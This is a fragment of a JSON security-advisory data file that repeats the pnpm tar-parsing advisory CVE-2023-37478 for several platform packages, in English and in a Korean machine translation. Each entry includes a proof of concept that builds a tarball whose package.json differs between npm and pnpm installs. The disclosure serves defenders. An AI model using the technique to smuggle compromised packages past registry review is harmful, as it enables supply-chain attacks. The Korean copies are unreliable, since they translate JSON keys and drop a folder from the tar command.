    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/macos-x64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/macos-arm64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/linuxstatic-arm64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/linux-x64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm.",
    "identifiers": "GHSA : GHSA-5r98-f33j-g8h7\nCVE : CVE-2023-37478",
    "severity": "HIGH",
    "updatedAt": "2023-08-01T17:00:56Z",
    "publishedAt": "2023-08-01T17:00:55Z",
    "references": "https://github.com/pnpm/pnpm/security/advisories/GHSA-5r98-f33j-g8h7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37478\nhttps://github.com/pnpm/pnpm/releases/tag/v7.33.4\nhttps://github.com/pnpm/pnpm/releases/tag/v8.6.8\nhttps://github.com/advisories/GHSA-5r98-f33j-g8h7",
    "name": "@pnpm/linux-arm64",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.33.4",
    "identifier": "7.33.4",
    "descriptionKR": "### 요약\nnpm을 통해 설치되거나 레지스트리에 의해 구문 분석될 때 안전하지만 pnpm을 통해 설치될 때 pnpm이 tar 아카이브를 구문 분석하는 방식으로 인해 악의적인 tarball을 구성할 수 있습니다.\n\n### 세부 정보\nTAR 형식은 추가 전용 아카이브 형식이므로 파일을 업데이트하는 방법에 대한 사양은 파일의 업데이트된 버전 끝에 새 레코드를 추가하는 것입니다. 이것은 아카이브가 예를 들어 `package.json`의 여러 복사본을 포함하는 것이 완전히 유효하다는 것을 의미하며 추출 시 예상되는 동작은 마지막 버전 이외의 모든 버전이 무시된다는 것입니다.\n\n이것은 tarball 추출 중에 모든 패키지 관리자가 첫 번째 경로 구성 요소를 삭제하도록 구성되어 업데이트를 수행하지 않고도 아카이브의 여러 루트 폴더를 사용하는 것만으로 충돌이 발생할 수 있기 때문에 더욱 복잡합니다.\n\npnpm이 tar-stream을 통해 tar 아카이브를 추출할 때 주어진 이름의 _first_ 파일만 추출하고 동일한 이름을 가진 모든 후속 파일을 버리는 것처럼 보입니다.\n\n### PoC\n다음 레이아웃으로 루트 폴더를 만듭니다.\n- `a/package.json`\n- `패키지/패키지.json`\n- `z/package.json`\n\n파일 내용:\n####/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^15\"\n    }\n}\n```\n#### 패키지/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 테스트 패키지의 잘못된 버전입니다\",\n    \"종속성\": {\n        \"반응\": \"^16\"\n    }\n}\n```\n#### z/패키지.json\n```json\n{\n    \"이름\": \"테스트 패키지\",\n    \"버전\": \"0.1.0\",\n    \"description\": \"이것은 좋은 버전의 테스트 패키지입니다\",\n    \"종속성\": {\n        \"반응\": \"^17\"\n    }\n}\n```\n\n그런 다음 tar 바이너리를 사용하여 tarball을 생성합니다(작업 디렉토리는 루트 폴더임).\n`tar -c -z --format ustar -f package.tgz 패키지 z`\n끝에 있는 폴더의 순서가 중요합니다. 마지막 것이 npm에 의해 추출될 때 승리하는 package.json이 됩니다. 첫 번째는 pnpm에 의해 추출될 때 승리하는 것입니다.\n\n`file:` 프로토콜을 통해 tarball을 설치합니다.\n\nnpm을 사용하면 잠금 파일에 `react@17`이 있고 pnpm을 사용하면 `react@15`가 있습니다.\n\n### 영향\n이로 인해 npm 레지스트리에 안전한 것으로 나타나거나 npm을 통해 설치된 패키지가 손상되거나 악성 버전으로 대체될 수 있습니다."
  },
  {
    "description": "### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### 